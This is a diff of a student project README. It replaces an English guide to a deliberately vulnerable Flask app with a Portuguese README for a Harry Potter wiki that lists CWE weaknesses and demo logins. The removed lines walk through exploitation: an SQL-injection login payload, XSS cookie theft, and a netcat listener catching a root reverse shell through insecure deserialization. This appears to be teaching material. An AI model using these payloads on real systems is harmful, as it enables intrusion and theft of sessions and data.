@@ -1,143 +1,50 @@
-# Vulnerable flask based web application
+# Correr o projeto
 
-Project with the goal to make one web application with two versions:
+## Server e Database
+Utilizando o xampp:
+1. Adicionar a pasta `server` do projeto a `/opt/lampp/htdocs`
+2. Correr xampp
+   1. `cd /opt/lampp`
+   2. `sudo ./manager-linux-x64.run`
+3. Em `localhost/dashboard`, selecionar phpMyAdmin
+4. Importar ficheiro `HPWiki.sql` que se encontra na pasta database
+    - emails e passwords:
+      - isabella@hotmail.com: iLoveDobby_3
+      - john@gmail.com: AvadaKedravaBellatrix
+      - lili_martinha@gmail.com: AvadaKedravaBellatrix88
 
-- app, web application with security issues
-- appsec, web application with the security issues fixed
+## Client
+Na pasta client de cada uma das apps:
+1. `npm install`
+2. `npm start`
 
-## Vulnerabilities present
+# Descrição do projeto
+Wiki sobre personagens do mundo de Harry Potter. É possível obter informação sobre as personagens e para comentar é necessário realizar login. Existem 2 tipos de utilizadores: os normais e os administradores. Os normais podem eliminar os seus próprios comentários e os administradores podem eliminar os comentários de qualquer utilizador.
 
-- Plaintext Passwords
-- SQLi
-- Forced Browsing
-- XSS
-- Insecure deserialization
+# Autores
 
-## Usage
+- Diana Siso, 98607, LEI
+- Miguel Ferreira, 98599, LEI
+- Raquel Ferreira, 98323, LEI
+- Sophie Pousinho, 97814, LEI
 
-### To run the web application
+# Vulnerabilidades
+- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
+- CWE-862: Missing Authorization
+- CWE-20: Improper Input Validation
+- CWE-549: Missing Password Field Masking
 
-1. Go to the desired web application directory
-2. Run the following command:
-    
-    ```bash
-    docker-compose up --build
-    ```
-    
-3. go to the following [url](http://localhost/) 
+# Tecnologias usadas
 
-### To run the POC (poorsploit.py)
+- React (front-end)
+- PHP (back-end)
+- MySQL (base de dados)
+- XAMPP (servidor)
 
-1. Go to the project directory
-2. Run the following command
-    
-    ```bash
-    python3 poorsploit.py
-    ```
-    
-3. Choose the exploit we want to exploit with the POC (poorsploit.py)
-    
-    ```bash
-    python3 poorsploit.py
-     ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
-    ||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||
-    ||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||
-    |/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)
-    
-    [?] Choose one of the options:
-           1 - SQli
-           2 - Insecure Deserialization
-           3 - XSS
-           4 - Forced Browsing
-           5 - quit
-    > 
-    ```
-    
+# Sites auxiliares
 
-### To run go into the database
+https://www.w3schools.com/php/php_form_validation.asp
 
-1. Check in witch container id the mysql db is running by executing the below command
-    
-    ```bash
-    docker ps
-    ```
-    
-2. Run the following command to get access to the mysql db
-    
-    ```bash
-    docker exec -it <container−id> mysql -h localhost -P 3306 -u root -proot
-    ```
-    
+https://github.com/lchaconc/Ejercicios-api/blob/master/ws-login/login.php
 
-## Exploitation
-
-### SQLi
-
-Manually:
-
-```bash
-username: <username of user we know exists>' -- \\
-password: <anything>
-```
-
-Automatically:
-
-```bash
-> python3 poorsploit.py
- ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ _________ 
-||P |||o |||o |||r |||s |||p |||l |||o |||i |||t |||       ||
-||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||_______||
-|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/_______\| (Metasploit at home™️)
-
-[?] Choose one of the options:
-       1 - SQli
-       2 - Insecure Deserialization
-       3 - XSS
-       4 - Forced Browsing
-       5 - quit
-> 1
-[!] Username is : root
-[!] Password is: root
-```
-
-### Forced Browsing
-
-1. Log in
-2. Run the poorsploit.py to check if there are any interesting directories on the robots.txt file
-3. Check out those directories mentioned
-
-### XSS
-
-1. Log in to post something
-2. Run the poorsploit.py to get the payload we are going to post on the website
-3. Just wait and see the poorsploit server output with the stolen cookies (it will repeat some)
-4. Close the server when done with ctrl+c
-
-### Insecure deserialization
-
-1. Log in as an user to get a cookie
-2. On our machine run a net cat listener for our reverse shell:
-    
-    ```bash
-    nc -lnvp 9999
-    ```
-    
-3. Run the poorsploit.py to get a cookie that enables us to run a reverse shell on the target machine
-4. Change the cookie we have on the browser for the one we got from poorsploit.py and refresh the page
-5. We get a root shell on our listener terminal like the following:
-    
-    ```bash
-    > nc -lnvp 9999
-    Connection from 172.20.0.4:49470
-    bash: cannot set terminal process group (1): Inappropriate ioctl for device
-    bash: no job control in this shell
-    root@aca189c0881c:/app#
-    ```
-    
-
-## Authors
-
-Rodrigo Lima, nmec: 98475 <br>
-Camila Fonseca, nmec: 97880 <br>
-Patrícia Dias, nmec: 98546 <br>
-Isadora Loredo, nmec: 91322 <br>
